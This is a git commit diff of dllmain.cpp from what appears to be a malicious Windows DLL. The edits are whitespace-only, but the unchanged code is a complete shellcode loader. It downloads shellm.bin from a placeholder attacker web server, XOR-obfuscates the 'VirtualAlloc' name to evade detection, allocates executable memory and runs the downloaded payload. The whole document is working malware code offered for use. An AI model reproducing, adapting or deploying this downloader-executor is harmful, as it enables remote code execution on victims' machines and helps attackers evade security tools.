28dc22b9322c7d35e48fbb086e7fd19f487d2849
nullsection <46195001+nullsection@users.noreply.github.com>
2024-09-10 23:03:45 +1000

    Update dllmain.cpp

--- dllmain.cpp
+++ dllmain.cpp
@@ -9,11 +9,8 @@
 void decode_string(unsigned char* key, unsigned char* text, int size) {
 
     for (int x = 0; x < size; x++) {
-
         text[x] = text[x] ^ key[x];
-
     }
-
     return;
 }
 
@@ -29,11 +26,9 @@ void do_shit() {
     if (hInternet == nullptr) {
         return;
     }
-
     // Open HTTP connection
     HINTERNET hUrl = InternetOpenUrl(hInternet, L"http://<YOUR WEB IP HERE>/shellm.bin", nullptr, 0, INTERNET_FLAG_RELOAD, 0);
     if (hUrl == nullptr) {
-        
         InternetCloseHandle(hInternet);
         return;
     }
@@ -43,17 +38,13 @@ void do_shit() {
     DWORD dwBufferSize = sizeof(DWORD);
     HttpQueryInfo(hUrl, HTTP_QUERY_CONTENT_LENGTH | HTTP_QUERY_FLAG_NUMBER, &contentLength, &dwBufferSize, nullptr);
     HANDLE processHandle = GetCurrentProcess();
-
     LPVOID(WINAPI * VirtualAllocEx)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
     unsigned char vk[] = "\xf6\xa3\x29\xed\x46\xa1\x32\x6c\xb4\x9a\x83\xc9\xfc\x3d";
-
     unsigned char vx[] = "\xa0\xca\x5b\x99\x33\xc0\x5e\x2d\xd8\xf6\xec\xaa\xb9\x45";
-
 
     decode_string(vk, vx, sizeof vx);
 
     (FARPROC&)VirtualAllocEx = load_func((LPCWSTR)"kernel32", (LPCSTR)vx);
-
     LPVOID lpMemory = VirtualAllocEx(processHandle, NULL, contentLength, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
    
     if (lpMemory == nullptr) {
@@ -62,18 +53,13 @@ void do_shit() {
         return;
     }
 
-    
     DWORD bytesRead;
-
     if (InternetReadFile(hUrl, lpMemory, contentLength, &bytesRead) && bytesRead == contentLength) {
-      
-
         char* char_ptr = static_cast<char*>(lpMemory);
         ((void(*)())char_ptr)();
 
     }
     else {
-        
         VirtualFree(lpMemory, 0, MEM_RELEASE);
         InternetCloseHandle(hUrl);
         InternetCloseHandle(hInternet);
@@ -84,7 +70,6 @@ void do_shit() {
     VirtualFree(lpMemory, 0, MEM_RELEASE);
     InternetCloseHandle(hUrl);
     InternetCloseHandle(hInternet);
-
     return;
 
 } 
